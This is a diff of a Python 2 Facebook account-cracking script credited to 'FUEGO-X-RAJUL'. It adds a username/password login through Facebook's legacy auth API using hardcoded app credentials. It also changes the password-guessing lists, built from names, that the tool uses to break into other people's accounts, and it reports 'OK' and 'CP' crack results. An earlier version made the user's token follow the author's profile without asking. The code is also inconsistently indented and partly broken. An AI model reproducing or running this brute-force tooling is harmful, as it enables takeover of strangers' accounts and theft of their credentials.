@@ -62,7 +62,7 @@ def logo():
 ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  \033[1;0m
 \033[1;97m--------------------------------------------------
 \033[1;93m➤\033[1;97m Author   : FUEGO-X-RAJUL
-\033[1;93m➤\033[1;97m Github   : https://github.com/Annonymos
+\033[1;93m➤\033[1;97m Github   : https://github.com/MAFIA-FUEGO
 \033[1;93m➤\033[1;97m Whatsapp : +27768432399
 \033[1;97m--------------------------------------------------""")
 def login():
@@ -76,21 +76,77 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		token = raw_input("[?] Enter Token : ")
-		if token == "":
-			print("Wrong Input")
-		try:
-			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
-			open("login.txt", "w").write(token)
-			#-> bot follow
-			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      #FUEGO X RAJUL
-			menu()
-		except KeyError:
-			os.system("rm -f login.txt")
-			exit("[?] Login Error")
+		    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
+    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
+    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack") 
+    print("\033[1;97m--------------------------------------------------")
+    clone_loginvia()
+def clone_loginvia():
+    hack = raw_input("\n╰─➣ ")
+    if hack =="1":
+        os.system("clear")
+        print logo
+	os.system("python3 .loading.md")
+        os.system('clear')
+	print logo
+        print ("\033[1;93mLogin With Token").center(50)
+	print("\033[1;97m--------------------------------------------------")
+        token = raw_input("\033[1;97m[+]\033[1;97m Paste :\033[1;97m ")
+	print("\033[1;97m--------------------------------------------------")
+        saving()
+        sav = open(".login.txt","w")
+        sav.write(token)
+        sav.close()
+        abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
+	os.system('xdg-open https://www.facebook.com/princess.lubisi.7')
+        time.sleep(1)
+        menu()
+    elif hack =="2":
+        loginfb()
+    elif hack =="0":
+	        menu()
+    else:
+	        print ("[!] Please Select a Valid Option")
+		clone_loginvia()
+		
+def loginfb():
+    os.system("clear")
+    print logo
+    os.system("python3 .loading.md")
+    time.sleep(1)
+    os.system('clear')
+    print logo
+    print("\033[1;93mLogin With Facebook Account\033[1;0m").center(50)
+    print("\033[1;93mUse Proxy to login account \033[1;0m").center(50)
+    print("\033[1;97m--------------------------------------------------")
+    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
+    id1 = id.replace(' ','')
+    id2 = id1.replace('(','')
+    uid = id2.replace(')','')
+    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
+    print("\033[1;97m--------------------------------------------------")
+    logging()
+    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
+    q = json.loads(data)
+    if "access_token" in q:
+        succ = open(".login.txt","w")
+        succ.write(q["access_token"])
+        succ.close()
+        print("\n\033[1;92m[✓] Login Successfull\033[0;97m")
+        time.sleep(1)
+        menu()
+    else:
+        if "www.facebook.com" in q["error_msg"]:
+            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
+            time.sleep(1)
+            loginfb()
+        else:
+            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
+            time.sleep(1)
+            loginfb()
 
 def menu():
-	os.system("clear")
+    os.system("clear")
 	global token
 	try:
 		token = open("login.txt","r").read()
@@ -112,7 +168,8 @@ def menu():
 	print("\033[1;97m[4]\033[1;91m-⋄-\033[1;97m Check crack results")
 	print("\033[1;97m[5]\033[1;91m-⋄-\033[1;97m User-agent settings \033[1;97m [ \033[1;95mPRO \033[1;97m]")
 	print("\033[1;97m[6]\033[1;91m-⋄-\033[1;97m Exit\033[1;97m [ \033[1;91m remove-token\033[1;97m]")
-	Bilal = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97mOption : ")
+	
+	Bilal = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -125,8 +182,10 @@ def menu():
 		massal()
 		method()
 	elif Bilal == "4" or Bilal == "04":
+		print(" ")
 		print("\033[1;97m[1]\033[1;91m-⋄-\033[1;97m Check results OK")
 		print("\033[1;97m[2]\033[1;91m-⋄-\033[1;97m Check results CP")
+		print(" ")
 		cek = raw_input("\033[1;97m[+]\033[1;91m-⋄-\033[1;97m Option : ")
 		if cek =="":
 			menu()
@@ -292,11 +351,11 @@ def bapi(user):
 	if len(name)>=6:
 		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
-		pwx = [ name+"3", name+"33", name+"333", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name+"3", name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"11", name+"111", name+"123", name+"12345" ]
+		pwx = [ name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	else:
-		pwx = [ name+"2", name+"22", name+"22", name+"123", name+"12345" ]
+		pwx = [ name+"2", name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
